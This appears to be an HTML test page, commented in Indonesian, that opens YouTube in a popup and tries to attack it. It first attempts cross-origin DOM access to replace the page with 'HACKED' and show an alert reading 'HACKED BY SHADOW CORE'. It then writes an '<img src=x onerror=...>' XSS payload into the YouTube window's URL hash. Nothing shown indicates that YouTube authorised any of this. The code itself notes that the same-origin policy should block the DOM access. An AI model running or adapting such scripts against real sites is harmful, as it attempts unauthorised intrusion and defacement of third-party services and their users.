<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>YouTube UXSS Test</title>
<style>
  body { font-family: monospace; background: #111; color: #0f0; padding: 20px; text-align: center; }
  button { padding: 15px 30px; font-size: 18px; background: #f00; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 20px; }
  button:hover { background: #c00; }
  #log { background: #000; padding: 15px; border: 1px solid #333; height: 200px; overflow-y: auto; text-align: left; margin-top: 20px; }
</style>
</head>
<body>

<h1>🎯 YouTube UXSS & Alert Test</h1>
<p>Mencoba memaksa YouTube memunculkan Alert.</p>
<button id="attackBtn">🚀 Buka YouTube & Inject Alert</button>

<div id="log">Menunggu...</div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  function log(msg, type = '') {
    var color = type === 'error' ? '#f44336' : (type === 'success' ? '#4caf50' : '#2196f3');
    logEl.innerHTML += `<div style="color:${color}">> ${msg}</div>`;
    console.log(msg);
  }

  document.getElementById('attackBtn').addEventListener('click', function() {
    logEl.innerHTML = '';
    log("Membuka YouTube...", 'info');

    // 1. Buka YouTube di tab baru
    var ytWin = window.open('https://www.youtube.com', '_blank');

    if (!ytWin) {
      log("❌ Popup diblokir. Izinkan popup untuk melanjutkan.", 'error');
      return;
    }

    // 2. Tunggu YouTube selesai loading
    setTimeout(function() {
      log("Mencoba akses DOM YouTube...", 'info');

      try {
        // Mencoba mengakses dokumen YouTube (Ini PASTI GAGAL karena SOP)
        var doc = ytWin.document;
        
        // Jika sampai sini, berarti BUG BESAR (UXSS)
        log("🚨 BUG CRITICAL: Akses DOM YouTube berhasil!", 'success');
        
        // Coba suntikkan alert
        doc.body.innerHTML = "<h1>HACKED</h1>";
        ytWin.alert("HACKED BY SHADOW CORE");

      } catch (e) {
        log("✅ Akses DOM YouTube diblokir oleh SOP: " + e.name, 'info');
        log("   (Ini adalah perilaku yang benar/aman)", 'info');
      }

      // 3. Trik Alternatif: Manipulasi URL (Hash/Params)
      try {
        log("Mencoba manipulasi URL YouTube via window.location...", 'info');
        
        // Trik: Mengubah hash untuk memicu event hashchange di YouTube
        // (Terkadang YouTube memiliki listener yang rentan terhadap DOM XSS via hash)
        ytWin.location.hash = "<img src=x onerror=alert('XSS')>";
        
        log("URL Hash telah diubah. Cek tab YouTube, apakah ada alert?", 'warn');
      } catch (e) {
        log("❌ Gagal mengubah URL: " + e.name, 'error');
      }

    }, 3000); // Tunggu 3 detik

  });

})();
</script>
</body>
</html>
